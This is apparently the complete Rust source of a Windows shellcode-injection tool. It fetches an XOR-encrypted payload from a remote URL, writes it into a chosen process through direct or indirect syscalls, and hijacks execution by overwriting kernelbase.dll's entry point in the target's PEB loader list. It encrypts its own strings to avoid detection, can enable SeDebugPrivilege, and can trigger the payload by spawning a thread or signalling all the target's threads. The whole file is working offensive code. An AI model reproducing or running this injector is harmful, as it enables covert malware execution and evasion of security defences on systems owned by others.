#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{ffi::c_void, mem::size_of, ptr, env, cell::UnsafeCell};
use windows::Win32::{System::{Threading::{PROCESS_BASIC_INFORMATION, PEB}, WindowsProgramming::LDR_DATA_TABLE_ENTRY, Kernel::LIST_ENTRY, Diagnostics::ToolHelp::THREADENTRY32}, Foundation::HANDLE};
use windows::Wdk::Foundation::OBJECT_ATTRIBUTES;
use data::{PVOID, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_COMMIT, MEM_RESERVE, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, CLIENT_ID};
use getopts::Options;

fn get_sh(url: &str, key: &str) -> String
{
    let mut bytes = lc!("");
    
    if url != ""
    {
        let response = minreq::get(url).send().unwrap();
        let encr = response.as_bytes();
        let decr = encr.to_vec();
        let size = decr.len();

        let mut view_ptr = decr.as_ptr() as *mut u8;
        unsafe
        {
            let key = format!("{}{}", key, "\0");
            let mut key_ptr = key.as_ptr();
            let mut xor_key: u8 = *key_ptr;
            key_ptr = key_ptr.add(1);
            while *key_ptr != '\0' as u8
            {
                xor_key = xor_key ^ *key_ptr;
                key_ptr = key_ptr.add(1);
            }
    
            let mut view_xor: Vec<u8> = vec![];
            for _i in 0..size
            {
                view_xor.push(*view_ptr ^ xor_key);
                view_ptr = view_ptr.add(1);
            }

            bytes = hex::encode(view_xor);
        }
        
    }

    bytes
}

fn main() {
    unsafe
    {
        let args: Vec<String> = env::args().collect();
        let program = args[0].clone();
        let mut opts = Options::new();

        // This way we avoid to have all of these strings in clear text in the resulting binary
        let help_name = lc!("help");
        let help_description = lc!("Print this help menu.");
        let pid_name = lc!("pid");
        let pid_description = lc!("Target process.");
        let force_name = lc!("force");
        let force_description = lc!("Spawn a dummy thread on target process to force the shellcode execution.");
        let signal_name = lc!("signal");
        let signal_description = lc!("Signal ALL target process' threads to exit. BE CAREFUL.");
        let debug_name = lc!("debug");
        let debug_description = lc!("Enable DEBUG privilege.");
        let syscall_name = lc!("indirect");
        let syscall_description = lc!("Use indirect syscalls.");
        let url_name = lc!("url");
        let url_description = lc!("Remote URL from which to download the payload.");
        let key_name = lc!("key");
        let key_description = lc!("Decryption key.");

        opts.optflag("h", &help_name, &help_description);
        opts.optopt("p", &pid_name, &pid_description,"");
        opts.optflag("f", &force_name, &force_description);
        opts.optflag("s", &signal_name, &signal_description);
        opts.optflag("d", &debug_name, &debug_description);
        opts.optflag("i", &syscall_name, &syscall_description);
        opts.optopt("u", &url_name, &url_description,"");
        opts.optopt("k", &key_name, &key_description,"");

        let matches = match opts.parse(&args[1..]) {
            Ok(m) => { m }
            Err(x) => {println!("{}",x);print!("{}","[x] Invalid arguments. Use -h for detailed help."); return; }
        };

        if matches.opt_present("h") || !matches.opt_present("p") 
        {
            print_usage(&program, opts);
            return;
        }

        if matches.opt_present("i")
        {
            dinvoke::use_indirect_sys(true);
            println!("{}", &lc!("[-] Using indirect syscalls."));
        }

        let mut url = "".to_string();
        let mut key = "".to_string();
        if matches.opt_present("u")
        {
            if matches.opt_present("k")
            {
                url = matches.opt_str("u").unwrap();
                key = matches.opt_str("k").unwrap();
            }
            else 
            {
                println!("{}", &lc!("[x] In-memory download requires a decryption key."));
                return;
            }
        }

        let mut dummy_thread = false;
        if matches.opt_present("f")
        {
            dummy_thread = true;
        }

        if matches.opt_present("d")
        {
            let privilege: u32 = 20; 
            let enable: u8 = 1; 
            let current_thread: u8 = 0;
            let e = u8::default();
            let enabled: *mut u8 = std::mem::transmute(&e); 
           
            //Enable SeDebugPrivilege
            let r = dinvoke::rtl_adjust_privilege(privilege, enable, current_thread, enabled);
            if r != 0 
            {
                println!("{}",&lc!("[x] SeDebugPrivilege could not be enabled."));
            }
            else
            {
                println!("{}",&lc!("[+] SeDebugPrivilege enabled."));
            }
        }

        let pid = matches.opt_str("p").unwrap().parse::<u32>().unwrap();

        let desired_access;
        if dummy_thread
        {
            desired_access = PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
        }
        else 
        {
            desired_access = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
        }

        let h = HANDLE::default();
        let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
        let o = OBJECT_ATTRIBUTES::default();
        let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
        let client_id = CLIENT_ID {unique_process: HANDLE{0: pid as isize}, unique_thread: HANDLE::default()};
        let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
        let status = dinvoke::nt_open_process(
            handle_ptr,
            desired_access,
            object_attributes,
            client_id
        );
        
        let phand: HANDLE = *handle_ptr;
        if phand.0 == 0 || status != 0
        {
            println!("{}",&lc!("[x] Couldn't open a handle to the target process."));
            return;
        }

        let module_to_hijack = dinvoke::get_module_base_address(&lc!("kernelbase.dll"));
        let addr = 0 as isize;
        let addr: PVOID = std::mem::transmute(addr);
        let base_address_shellcode: *mut PVOID = std::mem::transmute(&addr);
        let zero_bits = 0 as usize;
        let sh = get_sh(&url, &key);
        let decoded_sh = hex::decode(sh).expect("");
        let size_sh: UnsafeCell<usize> = decoded_sh.len().into();
        let size: *mut usize = size_sh.get();
        let ret = dinvoke::nt_allocate_virtual_memory(
            phand, 
            base_address_shellcode, 
            zero_bits, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);
        
        if ret != 0
        {
            println!("{}",&lc!("[x] Memory allocation failed."));
            return;
        }

        println!("{}",&lc!("[+] Memory successfully allocated."));

        let base_address: *mut c_void = *base_address_shellcode;
        let written: usize = 0;
        let buffer: *mut c_void = std::mem::transmute(decoded_sh.as_ptr());
        let nsize =  decoded_sh.len();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_write_virtual_memory(
            phand, 
            base_address, 
            buffer, 
            nsize, 
            bytes_written);

        if ret != 0 && *bytes_written < nsize
        {
            println!("{}",&lc!("[x] Loader writing failed."));
            return;
        }

        println!("{} 0x{:x}.",&lc!("[+] Loader written at"), base_address as isize);


        let size = size_sh.get();
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
        let ret = dinvoke::nt_protect_virtual_memory(
            phand, 
            base_address_shellcode, 
            size, 
            PAGE_EXECUTE_READ, 
            old_protection);

        if ret != 0
        {
            println!("{}",&lc!("[x] Execution permission could not be assigned."));
            return;
        } 


        // Get remote process' PEB base address
        let pi = PROCESS_BASIC_INFORMATION::default();
        let process_information: *mut c_void = std::mem::transmute(&pi);
        let ret = dinvoke::nt_query_information_process(
            phand, 
            0, 
            process_information,  
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut());
        
        if ret != 0
        {
            println!("{}",&lc!("[x] Call to NtQueryProcessInformation failed."));
            return;
        }

        let peb: PEB = std::mem::zeroed();
        let peb_ptr: *mut PEB = std::mem::transmute(&peb);
        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(process_information);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            phand, 
            (*process_information_ptr).PebBaseAddress as *mut _, 
            peb_ptr as *mut _, 
            size_of::<PEB>(), 
            bytes_written
        );

        if ret != 0
        {
            println!("{}",&lc!("[x] PEB of the remote process could not be retrieved."));
            return;
        } 

        println!("{} 0x{:x}.",&lc!("[-] Remote process' PEB is located at"), (*process_information_ptr).PebBaseAddress as isize);

        let peb_ldr_data: data::PEB_LDR_DATA = std::mem::zeroed();
        let peb_ldr_data_ptr: *mut data::PEB_LDR_DATA = std::mem::transmute(&peb_ldr_data);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            phand, 
            (*peb_ptr).Ldr as *mut _, 
            peb_ldr_data_ptr as *mut _, 
            size_of::<data::PEB_LDR_DATA>(), 
            bytes_written
        );

        if ret != 0
        {   
            println!("{}",&lc!("[x] PEB_LDR_DATA struct could not be retrieved."));
            return;
        }

        println!("{}",&lc!("[+] PEB's double-linked list found."));

        // Iterate over remote process PEB's loaded modules list
        let list_head = (*peb_ldr_data_ptr).in_load_order_module_list.Flink;
        let mut current_node = (*peb_ldr_data_ptr).in_load_order_module_list.Flink;
        loop 
        {
            let mut entry: LDR_DATA_TABLE_ENTRY  = std::mem::zeroed();
            let entry_ptr: *mut LDR_DATA_TABLE_ENTRY  = std::mem::transmute(&entry);
            let base_address = current_node as *mut c_void;
            let written = usize::default();
            let bytes_written: *mut usize = std::mem::transmute(&written);
            let ret = dinvoke::nt_read_virtual_memory(
                phand, 
                base_address, 
                entry_ptr as *mut _, 
                size_of::<LDR_DATA_TABLE_ENTRY>(), 
                bytes_written
            ); 

            if ret != 0
            {
                println!("{}",&lc!("[x] LDR_DATA_TABLE_ENTRY struct could not be retrieved."));
                return;
            }

            if entry.DllBase as isize == module_to_hijack 
            {
                println!("{}",&lc!("[-] Patching PEB..."));

                // Replace kernelbase.dll's entry point with our shellcode's base address
                entry.Reserved3[0] = (*base_address_shellcode as isize) as *mut _; 
                let ret = dinvoke::nt_write_virtual_memory(
                    phand, 
                    base_address, 
                    entry_ptr as *mut _, 
                    size_of::<LDR_DATA_TABLE_ENTRY>(), 
                    bytes_written
                ); 

                if ret != 0 && *bytes_written < nsize
                {
                    println!("{}",&lc!("[x] PEB patching failed."));
                    return;
                }

                println!("{}",&lc!("[+] Success!"));

               break;
            }
            current_node = (*entry_ptr).Reserved1[0] as *mut LIST_ENTRY;

            if current_node == list_head
            {
                break;
            }

        } 

        if dummy_thread
        {
            println!("{}",&lc!("[-] Spawning dummy thread..."));

            let k32 = dinvoke::get_module_base_address(&lc!("kernelbase.dll"));
            let exitthread = dinvoke::get_function_address(k32, &lc!("ExitThread"));

            let h = HANDLE::default();
            let handle: *mut HANDLE = std::mem::transmute(&h);
            let start_routine: PVOID = std::mem::transmute(exitthread);
            let ret = dinvoke::nt_create_thread_ex(
                handle,
                0x1FFFFF,
                ptr::null_mut(),
                phand,
                start_routine,
                ptr::null_mut(),
                0,0,0,0,
                ptr::null_mut()
            );

            if ret != 0
            {
                println!("{}",&lc!("[x] Dummy thread spawn failed."));
            }
            else 
            {
                println!("{}",&lc!("[+] Dummy thread successfully spawned."));
            }

        }
        else if matches.opt_present("s") 
        {
            signal_threads(pid);
        }

        dinvoke::close_handle(phand);
    }
}

fn signal_threads(pid: u32)
{
    unsafe
    {
        println!("{}",&lc!("[-] Sending WM_QUIT message to target process' threads..."));

        let u32 = dinvoke::load_library_a(&lc!("user32.dll"));
        let func: data::CreateToolhelp32Snapshot;
        let ret: Option<HANDLE>;
        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        dinvoke::dynamic_invoke!(k32,&lc!("CreateToolhelp32Snapshot"),func,ret,0x00000004,0); //TH32CS_SNAPTHREAD

        let snapshot = ret.unwrap();
        let mut te32: THREADENTRY32 = THREADENTRY32::default();
        te32.dwSize = size_of::<THREADENTRY32>() as u32;

        let f: data::Thread32First;
        let r: Option<bool>;
        let te32_ptr: *mut THREADENTRY32 = std::mem::transmute(&te32);
        dinvoke::dynamic_invoke!(k32,&lc!("Thread32First"),f,r,snapshot,te32_ptr);

        if !r.unwrap()
        {
            println!("{}",&lc!("[x] Call to Thread32First failed."));
            return;
        } 

        loop 
        {

            if te32.th32OwnerProcessID == pid
            {

                let func: data::PostThreadMessageA;
                let _ret: Option<bool>;
                dinvoke::dynamic_invoke!(u32,&lc!("PostThreadMessageA"),func,_ret,te32.th32ThreadID,0x0012,0,0); // 0x0012 = WM_QUIT 
             
            }

            let func: data::Thread32Next;
            let ret: Option<bool>;
            let te32_ptr: *mut THREADENTRY32 = std::mem::transmute(&te32);
            dinvoke::dynamic_invoke!(k32,&lc!("Thread32Next"),func,ret,snapshot,te32_ptr);
            if !ret.unwrap()
            {
                println!("{}",&lc!("[+] Target process' threads signaled."));
                break;
            } 

        }
    }

}

fn print_usage(program: &str, opts: Options) {
    let brief = format!("Usage: {}  -p <PID> [options]", program);
    print!("{}", opts.usage(&brief));
}